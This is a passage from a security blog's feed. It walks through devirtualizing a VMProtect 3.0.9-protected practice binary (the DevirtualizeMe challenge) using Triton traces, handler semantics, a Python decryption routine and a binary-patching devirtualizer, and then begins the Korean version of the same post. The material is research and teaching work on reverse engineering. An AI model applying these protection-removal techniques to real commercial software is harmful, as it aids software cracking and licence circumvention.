class="hljs-number">0x453e7e</span>: btc ax, <span class="hljs-number">0x47</span><span class="hljs-number">0x453e83</span>: btr eax, edx<span class="hljs-number">0x453e86</span>: mov eax, <span class="hljs-number">0</span><span class="hljs-number">0x453e8b</span>: jmp <span class="hljs-number">0x4620dd</span><span class="hljs-number">0x4620dd</span>: sub ebx, eax<span class="hljs-number">0x4620df</span>: shld eax, eax, <span class="hljs-number">0xe3</span><span class="hljs-number">0x4620e3</span>: sub eax, edi<span class="hljs-number">0x4620e5</span>: stc<span class="hljs-number">0x4620e6</span>: lea edi, [<span class="hljs-number">0x4620e6</span>]<span class="hljs-number">0x4620ec</span>: mov eax, dword ptr [esi]<span class="hljs-number">0x4620ee</span>: cmc<span class="hljs-number">0x4620ef</span>: test cl, <span class="hljs-number">0x19</span><span class="hljs-number">0x4620f2</span>: lea esi, [esi + <span class="hljs-number">4</span>]<span class="hljs-number">0x4620f8</span>: cmc<span class="hljs-number">0x4620f9</span>: test ebx, <span class="hljs-number">0x76f532e4</span><span class="hljs-number">0x4620ff</span>: <span class="hljs-keyword">xor</span> eax, ebx<span class="hljs-number">0x462101</span>: ror eax, <span class="hljs-number">1</span><span class="hljs-number">0x462103</span>: stc<span class="hljs-number">0x462104</span>: <span class="hljs-keyword">xor</span> eax, <span class="hljs-number">0x4acb3db9</span><span class="hljs-number">0x462109</span>: sub eax, <span class="hljs-number">0x458c0140</span><span class="hljs-number">0x46210e</span>: rol eax, <span class="hljs-number">1</span><span class="hljs-number">0x462110</span>: <span class="hljs-keyword">xor</span> ebx, eax<span class="hljs-number">0x462112</span>: cmc<span class="hljs-number">0x462113</span>: cmp bx, sp<span class="hljs-number">0x462116</span>: clc<span class="hljs-number">0x462117</span>: add edi, eax<span class="hljs-number">0x462119</span>: jmp <span class="hljs-number">0x4323ff</span>--- [ Logic End (0x432400) ] ---</code></pre><p>This is the <code>asm</code> trace produced by a Triton-based analysis script. It reconstructs the execution path of handler ID 82 using both <code>vmtrace.out</code> and the bytes from the actual binary.</p><p>Comparing registers before and after execution for each test case yields:</p><pre><code class="hljs c">=== <span class="hljs-keyword">case</span> <span class="hljs-number">1</span> bc = <span class="hljs-number">0x1ecbf564</span>init EAX = <span class="hljs-number">0x271c9</span> EBX = <span class="hljs-number">0x458b96</span> ESI = <span class="hljs-number">0x47fa63</span> EDI = <span class="hljs-number">0x4892af</span><span class="hljs-keyword">final</span> EAX = <span class="hljs-number">0x19fe78</span><span class="hljs-keyword">final</span> EBX = <span class="hljs-number">0xafe65f2</span><span class="hljs-keyword">final</span> ECX = <span class="hljs-number">0x20</span><span class="hljs-keyword">final</span> EDX = <span class="hljs-number">0x0</span><span class="hljs-keyword">final</span> ESI = <span class="hljs-number">0x47fa68</span><span class="hljs-keyword">final</span> EDI = <span class="hljs-number">0xb0480ee</span><span class="hljs-keyword">final</span> EBP = <span class="hljs-number">0x19fed4</span><span class="hljs-keyword">final</span> ESP = <span class="hljs-number">0x19fe18</span>diff EAX = <span class="hljs-number">0x1b8fb1</span> EBX diff = <span class="hljs-number">0xabbee64</span>=== <span class="hljs-keyword">case</span> <span class="hljs-number">2</span> bc = <span class="hljs-number">0x1ec6b25f</span>init EAX = <span class="hljs-number">0xfffcff9f</span> EBX = <span class="hljs-number">0xffb934ac</span> ESI = <span class="hljs-number">0x45cb37</span> EDI = <span class="hljs-number">0x432085</span><span class="hljs-keyword">final</span> EAX = <span class="hljs-number">0x19fc70</span><span class="hljs-keyword">final</span> EBX = <span class="hljs-number">0x20ae78f3</span><span class="hljs-keyword">final</span> ECX = <span class="hljs-number">0x20</span><span class="hljs-keyword">final</span> EDX = <span class="hljs-number">0x422a</span><span class="hljs-keyword">final</span> ESI = <span class="hljs-number">0x45cb3c</span><span class="hljs-keyword">final</span> EDI = <span class="hljs-number">0xdf5a6d09</span><span class="hljs-keyword">final</span> EBP = <span class="hljs-number">0x19fccc</span><span class="hljs-keyword">final</span> ESP = <span class="hljs-number">0x19fc10</span>diff EAX = <span class="hljs-number">0xffe503ef</span> EBX diff = <span class="hljs-number">0xdf174c5f</span>=== <span class="hljs-keyword">case</span> <span class="hljs-number">3</span> bc = <span class="hljs-number">0x1ec5393d</span>init EAX = <span class="hljs-number">0xfffdab5b</span> EBX = <span class="hljs-number">0xffbb44ce</span> ESI = <span class="hljs-number">0x46ef99</span> EDI = <span class="hljs-number">0x43cc41</span><span class="hljs-keyword">final</span> EAX = <span class="hljs-number">0x19fc60</span><span class="hljs-keyword">final</span> EBX = <span class="hljs-number">0x20ae78f3</span><span class="hljs-keyword">final</span> ECX = <span class="hljs-number">0xdcedb11a</span><span class="hljs-keyword">final</span> EDX = <span class="hljs-number">0x0</span><span class="hljs-keyword">final</span> ESI = <span class="hljs-number">0x46ef9e</span><span class="hljs-keyword">final</span> EDI = <span class="hljs-number">0xdf590927</span><span class="hljs-keyword">final</span> EBP = <span class="hljs-number">0x19fcbc</span><span class="hljs-keyword">final</span> ESP = <span class="hljs-number">0x19fc00</span>diff EAX = <span class="hljs-number">0xffe4573b</span> EBX diff = <span class="hljs-number">0xdf153c3d</span></code></pre><p>We can extract the following key observations:</p><p><strong>1. In every case, <code>ESI</code> increases by exactly 5.</strong></p><pre><code>- Case 1: `0x47fa63` &#x2192; `0x47fa68` (+5)- Case 2: `0x45cb37` &#x2192; `0x45cb3c` (+5)- Case 3: `0x46ef99` &#x2192; `0x46ef9e` (+5)So handler ID 82 consumes 5 bytes from the bytecode stream. This matches the earlier code: `movzx eax, byte ptr [esi]` / `add esi, 1` consumes the 1-byte opcode, and later `mov eax, [esi]` / `lea esi, [esi + 4]` consumes 4 more bytes. Together, that is `1 + 4 = 5` bytes.</code></pre><p><strong>2. <code>EBX</code> is updated to a completely new value.</strong></p><pre><code>The final `EBX` has no obvious direct relation to its initial value and is clearly the result of some transform. The `bc` (bytecode) values like `0x1ecbf564` go through the decryption routine (involving operations like `NOR`, `ADD`, `ROL`, etc.) to produce the final `EBX` values such as `0x0afe65f2`. Notice that in cases 2 and 3 the final `EBX` is the same: `0x20ae78f3`. Two different encrypted bytecode values (`0x1ec6b25f`, `0x1ec5393d`) converge to the same result, strongly suggesting a decryption function.</code></pre><p>Putting this together:</p><ul><li>Handler ID 82 reads from the bytecode stream:<ul><li>1 byte for the opcode</li><li>4 bytes for an encrypted immediate value</li></ul></li><li>It then runs a complex transform (XOR, SUB, ROL, etc.) on that 4-byte value and writes the result into <code>EBX</code>, effectively placing a constant on the virtual stack.</li></ul><p>This behavior matches what we would expect from an <code>LCONST</code> / <code>PUSH constant</code>-style handler.</p><h3 id="So-what-is-the-actual-arithmetic"><a href="#So-what-is-the-actual-arithmetic" class="headerlink" title="So what is the actual arithmetic?"></a>So what is the actual arithmetic?</h3><pre><code class="hljs c">TARGET_HANDLERS = [    <span class="hljs-number">0x44A8A7</span>, <span class="hljs-number">0x47F287</span>, <span class="hljs-number">0x4181BB</span>, <span class="hljs-number">0x40356C</span>, <span class="hljs-number">0x404F43</span>,    <span class="hljs-number">0x405B60</span>, <span class="hljs-number">0x405CB6</span>, <span class="hljs-number">0x405CE2</span>, <span class="hljs-number">0x404F5E</span>, <span class="hljs-number">0x404419</span>,    <span class="hljs-number">0x404E83</span>, <span class="hljs-number">0x4046BF</span>, <span class="hljs-number">0x4046DC</span>, <span class="hljs-number">0x4892AF</span>, <span class="hljs-number">0x41A261</span>,    <span class="hljs-number">0x45F79C</span>, <span class="hljs-number">0x496B0F</span>, <span class="hljs-number">0x474C45</span>, <span class="hljs-number">0x437E65</span>, <span class="hljs-number">0x493FB7</span>,    <span class="hljs-number">0x43CB8A</span>, <span class="hljs-number">0x46688C</span>, <span class="hljs-number">0x45B9AD</span>, <span class="hljs-number">0x432085</span>, <span class="hljs-number">0x484226</span>]</code></pre><p>The analysis above shows that we cannot reconstruct the full program logic from ID 82 alone. So I extended the same pipeline used for ID 82 to other handlers. Because there are many handlers, I first used static analysis plus trace-based hotspot analysis to pick only those handlers that are frequently called or appear semantically important.</p><h3 id="All-the-handlers-reveal-themselves"><a href="#All-the-handlers-reveal-themselves" class="headerlink" title="All the handlers reveal themselves"></a>All the handlers reveal themselves</h3><pre><code class="hljs c">&gt;&gt;&gt; Handler <span class="hljs-number">0x432085</span> (Length: <span class="hljs-number">39</span>)----------------------------------------  [M] <span class="hljs-number">0x432085</span>: movzx eax, byte ptr [esi]  [!] <span class="hljs-number">0x432088</span>: rol cx, <span class="hljs-number">0xc</span>  [!] <span class="hljs-number">0x43208c</span>: add esi, <span class="hljs-number">1</span>  [!] <span class="hljs-number">0x432096</span>: <span class="hljs-keyword">xor</span> al, bl  [!] <span class="hljs-number">0x43209a</span>: ror cx, <span class="hljs-number">0xf6</span>  [!] <span class="hljs-number">0x43209e</span>: sub al, <span class="hljs-number">0x3a</span>  [!] <span class="hljs-number">0x4320a0</span>: ror al, <span class="hljs-number">1</span>  [!] <span class="hljs-number">0x4320a2</span>: neg al  [!] <span class="hljs-number">0x4320aa</span>: <span class="hljs-keyword">not</span> al  [!] <span class="hljs-number">0x4320b1</span>: <span class="hljs-keyword">and</span> cx, si  [!] <span class="hljs-number">0x4320b4</span>: <span class="hljs-keyword">xor</span> bl, al  [!] <span class="hljs-number">0x4320b6</span>: mov ecx, dword ptr [ebp]  [!] <span class="hljs-number">0x4320bf</span>: add ebp, <span class="hljs-number">4</span>  [!] <span class="hljs-number">0x4320c5</span>: mov dword ptr [esp + eax], ecx  [!] <span class="hljs-number">0x4320c8</span>: ror eax, <span class="hljs-number">0xd2</span>  [!] <span class="hljs-number">0x4320cb</span>: mov eax, dword ptr [esi]  [!] <span class="hljs-number">0x4320cd</span>: add esi, <span class="hljs-number">4</span>  [!] <span class="hljs-number">0x4320de</span>: <span class="hljs-keyword">xor</span> eax, ebx  [!] <span class="hljs-number">0x4320e1</span>: ror eax, <span class="hljs-number">1</span>  [!] <span class="hljs-number">0x4320e3</span>: <span class="hljs-keyword">xor</span> eax, <span class="hljs-number">0x4acb3db9</span>  [!] <span class="hljs-number">0x4320ee</span>: sub eax, <span class="hljs-number">0x458c0140</span>  [!] <span class="hljs-number">0x4320f3</span>: rol eax, <span class="hljs-number">1</span>  [!] <span class="hljs-number">0x4320f5</span>: <span class="hljs-keyword">xor</span> ebx, eax  [!] <span class="hljs-number">0x4320fd</span>: add edi, eax----------------------------------------...</code></pre><p>Each of the addresses is the entry point of a VM handler. For each such entry, I repeated the same process used for ID 82:</p><ul><li>Segment splitting</li><li>Pattern clustering</li><li>Triton-based semantic extraction</li></ul><p>The sample above shows the extracted semantics for handler <code>0x00432085</code>. From this we can deduce:</p><ul><li>It advances <code>ESI</code> and consumes bytes from the bytecode stream</li><li>It updates <code>EBX</code>, <code>EDI</code>, and stack locations like <code>[esp + eax]</code> following a consistent pattern</li><li>It reads and writes virtual registers located on the stack, combining constants and memory values to construct new values</li></ul><p>By iterating this process, we can summarize each handler as a higher-level VM instruction: load, store, add, logical operations, branches, and so on. That is, we start to see each handler as one instruction in the VM&#x2019;s instruction set.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image17.png" alt></p><p>Once this is in place, the next step is to map each opcode value to its handler address. For this, I instrumented the VM dispatcher in Pin at the FETCH site and logged the opcode values being read.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image18.png" alt></p><p>Parsing that opcode log together with <code>vmtrace.out</code> allowed me to reverse-map each opcode to a handler entry address. For example, the opcode corresponding to ID 82 turned out to be <code>0x02</code>.</p><h3 id="Building-the-Devirtualizer"><a href="#Building-the-Devirtualizer" class="headerlink" title="Building the Devirtualizer"></a>Building the Devirtualizer</h3><p>At this stage we now have a one-to-one mapping between VM bytecodes and the actual handler addresses. The final step is to build a dedicated devirtualizer that reconstructs the entire virtualized function as native x86 and patches it back into the binary.</p><p>The overall design is:</p><ol><li>Read a mapping file that contains opcode (e.g. <code>0x02</code>, <code>0x40</code>, <code>0x88</code> &#x2026;), the handler entry address, and a summary of its semantics. This becomes the opcode &#x2192; [handler address, meaning, pseudocode] table.</li><li>Parse the VM bytecode stream from start to finish.</li><li><p>For each opcode, emit a corresponding native x86 code snippet which we prepared in advance, for example:</p><ul><li><code>LCONST</code> &#x2192; <code>MOV EBX, imm32</code></li><li><p><code>ADD</code> &#x2192; <code>ADD [ESP+4], EAX</code></p><p>  and so on.</p></li></ul></li><li><p>Concatenate all these snippets into a single region, forming a new native function body.</p></li><li>Finally, patch the original binary so that <code>vir_Entry</code> jumps directly into this new native function, bypassing the VM engine.</li></ol><p><img src="/2025/12/11/banda/VMPpart2/en/image19.png" alt></p><p>Here is part of my devirtualizer code. The loop iterates over each VM instruction and computes the offset into the <code>.vmp0</code> dump via <code>real_vip - VMP_BASE_ADDR</code>. It then skips the 1-byte opcode, looks up the handler name from <code>VM_HANDLERS</code>, and proceeds with reconstruction.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image20.png" alt></p><pre><code class="hljs c">val = (encrypted + <span class="hljs-number">0x55106798</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>val = (<span class="hljs-number">0</span> - val) &amp; <span class="hljs-number">0xFFFFFFFF</span>val = (val + <span class="hljs-number">0x69733a52</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>val = ((val &lt;&lt; <span class="hljs-number">1</span>) | (val &gt;&gt; <span class="hljs-number">31</span>)) &amp; <span class="hljs-number">0xFFFFFFFF</span>decrypted = ~val &amp; <span class="hljs-number">0xFFFFFFFF</span></code></pre><p>In the comments for each handler, I re-implemented the arithmetic sequence obtained by symbolically executing the handler with Triton, writing it out as 32-bit modular arithmetic in Python, as in the example above.</p><p>For instance, suppose the handler takes a 32-bit encrypted constant as input, then applies exactly these steps as observed in the VM:</p><ul><li>Add a constant</li><li>Compute <code>0 - val</code></li><li>Add another constant</li><li>Rotate left by 1 bit</li><li>Apply a bitwise <code>NOT</code></li></ul><p>We can encode that logic exactly as shown, yielding a <code>decrypted</code> value that matches what the VM computes.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image21.png" alt></p><p>For key handlers like <code>ADD</code>, <code>NOR</code>, <code>COPY</code>, <code>SHL</code>, <code>SHR</code>, I distilled their stack-top operations plus flag reconstruction into clean native code fragments, and then used the Keystone assembler to convert them into machine code. Those bytes were pushed into a <code>patch_buffer</code> in order, and the devirtualizer overwrote a pre-allocated region in a duplicated binary named <code>devirtualizeme_unpacked.exe</code> with this buffer.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image22.png" alt></p><p>At the end of this long journey, we finally get to see the restored native x86 code: the devirtualized function. This code is entirely generated from the data we collected and analyzed and represents the original logic in a straightforward x86 form. If you open this region in IDA on the patched binary, you will now see clean assembly in place of VMP&#x2019;s obfuscated engine code.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image23.png" alt></p><p>To compare before and after, I looked at the beginning of the <code>.vmp0</code> region. Before patching, the section is filled with VMP-specific obfuscated code: meaningless operations and tangled jumps.</p><p><img src="/2025/12/11/banda/VMPpart2/en/image24.png" alt></p><p>After patching, the same location now contains a normal native x86 function that pops values from the stack and performs simple operations such as <code>AND</code>, <code>SHR</code>, and <code>SHL</code>. When you run the patched binary, it no longer goes through the VMProtect engine; instead, it executes the restored native function directly. Pressing P still triggers the same virtualized logic and shows the original message box&#x2014;just without the VM.</p><h2 id="Wrapping-Up-Devirtualization-Success"><a href="#Wrapping-Up-Devirtualization-Success" class="headerlink" title="Wrapping Up: Devirtualization Success"></a>Wrapping Up: Devirtualization Success</h2><p><img src="/2025/12/11/banda/VMPpart2/en/image25.png" alt></p><p>I will conclude with a screenshot showing the successful devirtualization. For the virtualized target function, I patched <code>vir_Entry</code> so that it jumps directly into the native code block I generated instead of the VMP dispatcher.</p><p>Originally I planned to stop at Part 2, but now I feel like trying even harder virtualization challenges and unpacking them as well. While writing Part 2, I also thought a lot about how far one could push devirtualization by combining this approach with LLVM, and if I ever write a follow-up in this series, that will very likely be the topic.</p><p>Thank you for joining me on this journey through deobfuscation. &#x1F601;</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://forum.tuts4you.com/topic/39481-devirtualizeme-vmprotect-309/#comment-190252">https://forum.tuts4you.com/topic/39481-devirtualizeme-vmprotect-309/#comment-190252</a></li><li><a href="https://hackyboiz.github.io/2025/09/11/banda/LLVM_based_VMP/ko/">https://hackyboiz.github.io/2025/09/11/banda/LLVM_based_VMP/ko/</a></li><li><a href="https://whereisr0da.github.io/blog/posts/2021-01-05-vmp-1/">https://whereisr0da.github.io/blog/posts/2021-01-05-vmp-1/</a></li><li><a href="https://secret.club/2021/09/08/vmprotect-llvm-lifting-1.html">https://secret.club/2021/09/08/vmprotect-llvm-lifting-1.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/banda/">banda</category>
      
      <category domain="https://hackyboiz.github.io/tags/VMProtect/">VMProtect</category>
      
      <category domain="https://hackyboiz.github.io/tags/Pin/">Pin</category>
      
      <category domain="https://hackyboiz.github.io/tags/Triton/">Triton</category>
      
      <category domain="https://hackyboiz.github.io/tags/devirtualize/">devirtualize</category>
      
      <category domain="https://hackyboiz.github.io/tags/unpack/">unpack</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/11/banda/VMPpart2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] VMProtect Devirtualization: Part 2 (KR)</title>
      <link>https://hackyboiz.github.io/2025/12/11/banda/VMPpart2/ko/</link>
      <guid>https://hackyboiz.github.io/2025/12/11/banda/VMPpart2/ko/</guid>
      <pubDate>Thu, 11 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2025/12/11/banda/VM</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><img src="/2025/12/11/banda/VMPpart2/ko/main.png" alt></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; banda&#xC785;&#xB2C8;&#xB2E4;. :)<br>VMProtect Part 1&#xC5D0; &#xC608;&#xC0C1;&#xBCF4;&#xB2E4; &#xD070; &#xAD00;&#xC2EC;&#xC744; &#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC800;&#xB294; &#xAD00;&#xC2EC;&#xC774; &#xB354; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB294; VMProtect Part 2&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; &#xC800;&#xBC88; &#xC774;&#xB860; &#xC911;&#xC2EC;&#xC758; &#xC5F0;&#xAD6C;&#xAE00;&#xC758; &#xD750;&#xB984;&#xC5D0; &#xC774;&#xC5B4; part 2&#xB294; real-world&#xB85C; &#xD655;&#xC7A5;&#xD574;&#xBCF4;&#xB294; &#xAE00;&#xC744; &#xC368;&#xBCF4;&#xACE0; &#xC2F6;&#xC5C8;&#xACE0;, &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xACFC; &#xD568;&#xAED8;, &#xC2E4;&#xC81C; VMProtect 3&#xC73C;&#xB85C; virtualize&#xB41C; &#xD568;&#xC218;&#xB4E4;&#xC744; devirtualized binary / restored code&#xB85C; &#xD574;&#xB3C5;&#xD574;&#xBCF4;&#xB294; &#xC2E4;&#xC2B5;&#xC744; &#xC9C4;&#xD589;&#xD574;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC758; &#xAC8C;&#xC2DC;&#xAE00;&#xC740; <a href="https://hackyboiz.github.io/2025/09/11/banda/LLVM_based_VMP/ko/">VMProtect Devirtualization Part 1</a>&#xC744; &#xBA3C;&#xC800; &#xBCF4;&#xACE0; &#xC624;&#xC2DC;&#xB294; &#xAC83;&#xC744; &#xCD94;&#xCC9C;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;!</p><p>&#xBCF8; unpacking &#xAE00;&#xC740; &#xAD50;&#xC721; &#xBC0F; &#xC5F0;&#xAD6C; &#xBAA9;&#xC801;&#xC5D0;&#xC11C; &#xC791;&#xC131;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xC724;&#xB9AC;&#xC801;&#xC778; &#xAE30;&#xC900;&#xC744; &#xC9C0;&#xD0A4;&#xBA70; &#xC0DD;&#xD0DC;&#xACC4;&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xB294;&#xB370; &#xB3D9;&#xCC38;&#xD574; &#xC8FC;&#xAE30; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;.</p><h2 id="Devirtualization-Rules"><a href="#Devirtualization-Rules" class="headerlink" title="Devirtualization Rules"></a>Devirtualization Rules</h2><p><img src="/2025/12/11/banda/VMPpart2/ko/image1.png" alt></p><p>&#xCC4C;&#xB9B0;&#xC9C0;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC804;&#xC5D0;, &#xBA3C;&#xC800; &#xAC00;&#xC0C1;&#xD654; &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xAE30;&#xBCF8; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB97C; &#xAC04;&#xB2E8;&#xD788; &#xC815;&#xB9AC;&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!  &#xC6D0;&#xB798; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; x86, x64 &#xAC19;&#xC740; &#xC2E4;&#xC81C; CPU&#xC6A9; &#xAE30;&#xACC4;&#xC5B4;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; VMProtect, Themida &#xAC19;&#xC740; &#xAC00;&#xC0C1;&#xD654; &#xB09C;&#xB3C5;&#xD654; &#xB3C4;&#xAD6C;&#xB294; &#xC774; &#xCF54;&#xB4DC;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xB450;&#xC9C0; &#xC54A;&#xACE0;</p><ol><li>&#xC6D0;&#xB798; x86 &#xCF54;&#xB4DC;&#xB97C; &#x201C;&#xAC00;&#xC0C1; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#x201D;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xACE0;</li><li>&#xC774; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;(VM) &#xCF54;&#xB4DC;&#xB97C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC548;&#xC5D0; &#xC9D1;&#xC5B4;&#xB123;&#xC740; &#xB2E4;&#xC74C;</li><li>&#xC2E4;&#xC81C; &#xC2E4;&#xD589; &#xC2DC;&#xC5D0;&#xB294; &#xC774; VM&#xC774; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB97C; &#xD558;&#xB098;&#xC529; &#xD574;&#xC11D;&#xD558;&#xBA74;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.<br><br></li></ol><p><strong>VM State Transition (VM &#xC0C1;&#xD0DC; &#xC804;&#xC774;)</strong></p><p>&#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C;&#xB97C; &#xC774;&#xD574;&#xD558;&#xB824;&#xBA74;, &#x201C;VM&#xC774; &#xC5B4;&#xB5A4; &#xC0C1;&#xD0DC;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xACE0;, &#xADF8; &#xC0C1;&#xD0DC;&#xAC00; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xAC70;&#xCE58;&#xBA74;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xBCC0;&#xD558;&#xB294;&#xC9C0;&#x201D;&#xC5D0; &#xC9D1;&#xC911;&#xD558;&#xC2DC;&#xB294; &#xAC8C; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; VM&#xC758; &#xC0C1;&#xD0DC;(State) &#xC815;&#xC758;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ldif"><span class="hljs-attribute">VIP</span>: Virtual Instruction Pointer<span class="hljs-attribute">VSP</span>: Virtual Stack Pointer<span class="hljs-attribute">VStack &#xB0B4;&#xC6A9;</span>: &#xC2A4;&#xD0DD;&#xC5D0; &#xC313;&#xC5EC; &#xC788;&#xB294; &#xAC12;&#xB4E4;<span class="hljs-attribute">Scratch</span>: &#xC784;&#xC2DC; &#xC800;&#xC7A5;&#xC18C;<span class="hljs-attribute">VFlags</span>: &#xAC00;&#xC0C1; &#xD50C;&#xB798;&#xADF8;&#xB4E4;(ZF, CF &#xAC19;&#xC740; &#xC5ED;&#xD560;)</code></pre><p>&#xC544;&#xBB34;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xC2EC;&#xD558;&#xB2E4;&#xACE0; &#xD574;&#xB3C4;, &#xACB0;&#xAD6D; &#xC911;&#xC694;&#xD55C;&#xAC74; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xAC70;&#xCE58;&#xACE0; &#xB098;&#xC11C; &#x2018;&#xC0C1;&#xD0DC; &#xBB36;&#xC74C;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xBC14;&#xB00C;&#xC5C8;&#xB098;&#x2019;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC83; &#xBFD0;&#xC785;&#xB2C8;&#xB2E4;. VM&#xC740; CPU&#xAC00; &#xC544;&#xB2C8;&#xB77C;, <code>VIP</code>, <code>VStack</code>, <code>Scratch</code>, <code>VFlags</code>&#xC744; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xBC1B;&#xC544;&#xC11C; &#xB2E4;&#xC2DC; &#xC0C8;&#xB85C;&#xC6B4; <code>VIP</code>, <code>VStack</code>, <code>Scratch</code>, <code>VFlags</code>&#xC744; &#xB0B4;&#xB193;&#xB294; &#xC0C1;&#xD0DC; &#xC804;&#xC774; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xC9D1;&#xD569;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xACE0;, &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xB54C;&#xB294; &#xB514;&#xC2A4;&#xC5B4;&#xC148;&#xBE14;&#xB9AC; &#xC804;&#xCCB4;&#xB97C; &#xB2E4; &#xC774;&#xD574;&#xD558;&#xB824;&#xACE0; &#xD558;&#xAE30;&#xBCF4;&#xB2E4; &#x2018;&#xC774; &#xD578;&#xB4E4;&#xB7EC;&#xAC00; VM &#xC0C1;&#xD0DC;&#xB97C; &#xC774;&#xB807;&#xAC8C; &#xBC14;&#xAFBC;&#xB2E4;&#x2019;&#xB77C;&#xB294;&#xAC78; &#xC694;&#xC57D;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xADF8; &#xD578;&#xB4E4;&#xB7EC; &#xC758;&#xBBF8;&#xB294; &#xB2E4; &#xD30C;&#xC545;&#xD55C; &#xAC81;&#xB2C8;&#xB2E4;.</p><h2 id="DevirtualizeMe-Challenge-VMP32-v1"><a href="#DevirtualizeMe-Challenge-VMP32-v1" class="headerlink" title="DevirtualizeMe Challenge - VMP32 v1"></a>DevirtualizeMe Challenge - VMP32 v1</h2><p><img src="/2025/12/11/banda/VMPpart2/ko/image2.png" alt></p><p>&#xC774;&#xBC88;&#xC5D0; &#xC2E4;&#xC2B5;&#xD574;&#xBCFC; Challenge&#xB294; Tuts4You&#xC758; <a href="https://forum.tuts4you.com/topic/39481-devirtualizeme-vmprotect-309/#comment-190252">DevirtualizeMe</a>&#xC785;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; C++ &#xD074;&#xB798;&#xC2A4; <code>UnpackMe</code>&#xB97C; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xBA70;, VMProtect 3.0.9&#xC758; Virtualization &#xBCF4;&#xD638;&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAE00;&#xC758; &#xBAA9;&#xD45C;&#xB294; &#xCCA8;&#xBD80;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC548;&#xC5D0;&#xC11C; VMProtect&#xAC00; &#xAC00;&#xC0C1;&#xD654;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xCC3E;&#xC544;&#xB0B4;&#xACE0;, &#xADF8; &#xC704;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xC758; &#xC758;&#xBBF8;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xAC70;&#xB098; &#xBCF8;&#xB798; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC; &#xC218;&#xC900;&#xC758; 